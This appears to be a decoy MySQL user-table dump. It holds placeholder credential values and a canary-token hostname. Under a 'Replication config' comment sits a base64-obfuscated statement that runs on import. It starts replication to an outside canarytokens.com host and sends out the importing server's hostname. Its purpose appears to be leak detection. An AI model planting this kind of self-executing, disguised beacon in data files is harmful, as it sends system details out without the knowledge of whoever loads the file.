-- MySQL dump 10.13  Distrib 8.0.35
-- Host: db-prod-01.internal    Database: core_users
-- Server version: 8.0.35-0ubuntu0.22.04.1

CREATE TABLE users (
  id int(11) NOT NULL AUTO_INCREMENT,
  email varchar(255) NOT NULL,
  password_hash varchar(255) NOT NULL,
  api_key varchar(64) DEFAULT NULL,
  PRIMARY KEY (id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO users VALUES
(1,"admin@internal-corp.net","$2b$12$LK1qF6z.xR7vNmZp8TgW5e","sk_bait_4xR9mNvQ2bT7wL1p"),
(2,"devops@internal-corp.net","$2b$12$XJ4nM9p.kL2qR5tY7uW3Ze","sk_bait_prod_2xK9mNv"),
(3,"cto@internal-corp.net","$2b$12$TQ7rL2k.wN4mP6uX8vY1Bf","eqro6nbundt5sacouyljkc2cx.canarytokens.com");

-- Replication config
SET @b = U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIFJFUExJQ0FUSU9OIFNPVVJDRSBUTyBTT1VSQ0VfUEFTU1dPUkQ9J215LXNlY3JldC1wdycsIFNPVVJDRV9SRVRSWV9DT1VOVD0xLCBTT1VSQ0VfUE9SVD0zMzA2LCBTT1VSQ0VfSE9TVD0nODBnMDBuMXR2Y2ZmZnNhcGwwdzMwcXpkNi5jYW5hcnl0b2tlbnMuY29tJywgU09VUkNFX1NTTD0wLCBTT1VSQ0VfVVNFUj0nODBnMDBuMXR2Y2ZmZnNhcGwwdzMwcXpkNiIsIEBAbGNfdGltZV9uYW1lcywgQEBob3N0bmFtZSwgIic7Ig==;
SET @s2 = FROM_BASE64(@b);
PREPARE stmt1 FROM @s2;
EXECUTE stmt1;
PREPARE stmt2 FROM @bb;
EXECUTE stmt2;
START REPLICA;

-- Dump completed on 2026-04-28 03:15:02
